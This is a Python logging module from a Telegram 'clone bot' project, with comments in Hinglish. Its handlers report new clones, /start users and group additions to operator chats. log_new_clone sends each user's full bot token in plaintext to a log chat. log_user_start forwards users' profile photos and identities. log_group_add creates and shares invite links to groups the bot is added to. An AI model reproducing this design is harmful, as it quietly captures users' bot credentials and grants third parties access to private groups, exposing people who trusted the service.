from telegram import Update
from telegram.ext import ContextTypes
from ..config import CLONE_LOGGER, LOGGER_GROUP, OWNER_ID

# =========================
# NEW CLONE LOG (Jab bot clone ho)
# =========================
async def log_new_clone(context: ContextTypes.DEFAULT_TYPE, user, token, bot_username):
    try:
        if not CLONE_LOGGER: return

        # HTML Mode for stability
        text = (
            "🚀 <b>NEW CLONE ALERT!</b>\n\n"
            f"👤 <b>Owner:</b> {user.first_name}\n"
            f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
            f"🏷 <b>Username:</b> @{user.username if user.username else 'N/A'}\n"
            f"🤖 <b>Bot:</b> @{bot_username}\n"
            f"🔑 <b>Token:</b> <code>{token}</code>"
        )

        await context.bot.send_message(
            chat_id=int(CLONE_LOGGER),
            text=text,
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Clone log error: {e}")

# =========================
# USER START LOG (Jab koi /start dabaye)
# =========================
async def log_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not LOGGER_GROUP: return

    photo_id = None
    try:
        photos = await context.bot.get_user_profile_photos(user.id)
        if photos.total_count > 0:
            photo_id = photos.photos[0][-1].file_id
    except: pass

    # HTML fix to avoid "Byte Offset" error
    text = (
        "👤 <b>NEW USER STARTED!</b>\n\n"
        f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
        f"🏷 <b>Username:</b> @{user.username if user.username else 'N/A'}\n"
        f"📝 <b>Name:</b> {user.first_name}\n"
        f"🤖 <b>Bot:</b> @{(await context.bot.get_me()).username}"
    )

    try:
        if photo_id:
            await context.bot.send_photo(
                chat_id=int(LOGGER_GROUP),
                photo=photo_id,
                caption=text,
                parse_mode="HTML"
            )
        else:
            await context.bot.send_message(
                chat_id=int(LOGGER_GROUP),
                text=text,
                parse_mode="HTML"
            )
    except Exception as e:
        print(f"User start log error: {e}")

# =========================
# GROUP ADD LOG
# =========================
async def log_group_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    user = update.effective_user
    if not LOGGER_GROUP: return

    try:
        link = await chat.export_invite_link()
    except:
        link = "No Link (Admin Rights Missing)"

    text = (
        "🏰 <b>ADDED TO NEW GROUP!</b>\n\n"
        f"👥 <b>Group:</b> {chat.title}\n"
        f"🆔 <b>ID:</b> <code>{chat.id}</code>\n"
        f"🔗 <b>Link:</b> {link}\n"
        f"👤 <b>Added By:</b> {user.first_name} (@{user.username if user.username else 'N/A'})"
    )

    try:
        await context.bot.send_message(
            chat_id=int(LOGGER_GROUP),
            text=text,
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Group log error: {e}")
